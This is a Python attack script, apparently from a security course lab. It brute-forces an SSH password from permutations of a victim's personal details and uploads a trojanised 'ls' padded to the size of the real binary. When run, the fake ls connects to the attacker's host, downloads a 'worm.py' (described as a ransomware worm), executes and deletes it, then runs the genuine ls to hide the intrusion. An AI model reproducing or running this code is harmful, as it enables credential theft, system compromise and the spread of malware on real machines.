#!/usr/bin/python3
# ./crack_attack <Victim IP> <Attacker IP> <Attacker port> 
# ./crack_attack 172.18.0.3 172.18.0.2 8888
import paramiko
import sys
import itertools
import os
import subprocess
import binascii
from zipfile import ZipFile, ZIP_DEFLATED
import threading

victim_ip = sys.argv[1]
attacker_ip = sys.argv[2]
attacker_port = sys.argv[3]

def read_victim_info():
    with open('/app/victim.dat') as f:
        return f.read().splitlines()

def ssh_login(host, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port, username, password)
    except:
        client.close()
        return False
    else:
        client.close()
        return True

def temp_ls_sign(payload):
    ls_path = "/usr/bin/ls"
    fake_ls_path = "temp_ls"

    org_size = os.path.getsize(ls_path)
    temp_size = len(payload)

    with open(fake_ls_path, "ab") as f:
        padding_size = org_size - temp_size - 4
        f.write(b'\x00' * padding_size)
        f.write(b'\xaa\xbb\xcc\xdd')

def compress_ls():
    with ZipFile('/tmp/ls.zip', "w", ZIP_DEFLATED) as f:
        f.write('/usr/bin/ls',arcname='ls')
    with open("/tmp/ls.zip", "rb") as f:
        return f.read()

def compression_virus(attacker_ip, attacker_port, ls_zip):
    ls_hex = binascii.hexlify(ls_zip)

    payload = f"""#!/usr/bin/python3
import sys
import os
import socket
import binascii
from zipfile import ZipFile
import subprocess

ls_bytes = {ls_hex}.decode('utf-8')

def worm_transfer(ip, port):
    victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    victim_socket.connect((ip, port))
    recv_file = 'worm.py'
    with open(recv_file, 'wb') as f:
        while True:
            data = victim_socket.recv(1024)
            if not data:
                break
            f.write(data)
    victim_socket.close()

    
def execution():
    worm_transfer("{attacker_ip}", {attacker_port})
    subprocess.run(["python3", "worm.py"], check=True)
    subprocess.run(["rm", "worm.py"])

    true_ls = binascii.unhexlify(ls_bytes)
    with open("/tmp/ls.zip", 'wb') as f:
        f.write(true_ls)
    with ZipFile("/tmp/ls.zip", "r") as f:
        f.extractall("/tmp/")
    subprocess.run(["chmod", "+x", "/tmp/ls"])
    subprocess.run(["rm", "/tmp/ls.zip"])
    result = subprocess.run(["/tmp/ls"] + sys.argv[1:], check=False).returncode
    subprocess.run(["rm", "/tmp/ls"])
    return result

if __name__ == "__main__":
    execution()
    """

    with open("temp_ls", "wb") as f:
        f.write(payload.encode())
    temp_ls_sign(payload)

def main():
    # task1: crack ssh password
    # Cracking the victim’s password by launching a dictionary attack
    # username is csc2024
    victim_info = read_victim_info()
    # store all possible combinations of the victim's personal information first (dont login yet)
    possible_combinations = []
    for i in range(1, len(victim_info)+1):
        for permutation in itertools.permutations(victim_info, i):
            password = ''.join(permutation)
            possible_combinations.append(password)

    # try each combination to login
    Password = ""
    found_password = threading.Event()

    def try_password(password):
        nonlocal Password
        if found_password.is_set():
            return
        if ssh_login(victim_ip, 22, 'csc2024', password):
            Password = password
            print('Password found:', password)
            found_password.set()

    threads = []
    for password in possible_combinations:
        if found_password.is_set():
            break
        print('Trying:', password)
        thread = threading.Thread(target=try_password, args=(password,))
        threads.append(thread)
        thread.start()
        if len(threads) >= 5:
            print("--------------")
            for thread in threads:
                thread.join()
            threads = []

    for thread in threads:
        thread.join()

    # task2: Create a compression virus with the propagation of the  ransomware worm 
    if ssh_login(victim_ip, 22, 'csc2024', Password):
        print('Login successful')
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(victim_ip, 22, 'csc2024', Password)

        # compress the /usr/bin/ls file in attacker
        # then send the compressed file to the victim
        ls_zip = compress_ls()
        compression_virus(attacker_ip, attacker_port, ls_zip)
        sftp = client.open_sftp()
        sftp.put('./temp_ls', '/app/ls')
        client.exec_command('chmod +x /app/ls')
        client.close()
        
    subprocess.run(["rm", "./temp_ls"])

if __name__ == '__main__':
    main()
